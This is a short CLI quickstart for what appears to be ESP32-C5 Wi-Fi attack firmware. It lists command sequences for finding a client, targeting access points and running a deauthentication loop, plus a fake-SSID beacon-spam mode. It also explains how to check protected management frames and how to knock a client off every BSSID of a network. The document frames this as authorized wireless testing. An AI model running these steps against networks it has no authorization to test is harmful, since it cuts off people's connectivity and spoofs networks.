# CLI quickstart

All addresses below are placeholders. Replace them with the client and AP you
are authorized to test.

```text
scan
findsta 02:00:00:00:00:01 36,1,6,11
rsn 02:11:22:33:44:55
target 02:00:00:00:00:01
clear
bssid 02:11:22:33:44:55 36
bssid 02:11:22:33:44:56 1
ch 36
start
status
stop
```

## Fake SSIDs (5G beacon spam)

Generate 100 fake 5G SSIDs on the current channel:

```text
ch 36
beaconspam auto 100
status
stopbeacons
```

Or use custom names (up to 128):

```text
ch 36
beaconspam MyNet-1,MyNet-2,MyNet-3
stopbeacons
```

`beaconspam` switches the C5 to AP mode; `scan`, `findsta`, and deauth are
unavailable until `stopbeacons` restores STA mode. The AP/driver rotates the
injected beacons at roughly 80–90 per second, so a single scan may show only a
subset of a large list. The fake networks are open and have no DHCP/portal
behind them.

## Notes

- `findsta` needs the client to transmit. Ping it from another machine, or
  otherwise keep traffic flowing, while the sweep runs. The optional channel
  list (`36,1,6,11`) makes a sweep much faster than scanning every channel.
- `rsn <bssid>` prints the AP's RSN AKM and capabilities:
  `caps=0x000C MFPC=0 MFPR=0` means PMF is not enabled.
  `MFPC=1` / `MFPR=1` means protected management frames are advertised and
  deauth/disassoc may be ignored.
- `bssid <mac> [ch]` can add up to eight entries, each with its own channel.
  The attack loop switches 2.4 GHz/5 GHz as needed.
- A deauth removes the client from the targeted BSSID. On a mesh/multi-AP
  network it may reassociate to another BSSID of the same SSID. To push it off
  an SSID, all of that SSID's BSSIDs on both bands must be suppressed.
- A single ESP32 has one Wi-Fi radio; it cannot transmit on 2.4 GHz and 5 GHz
  simultaneously.
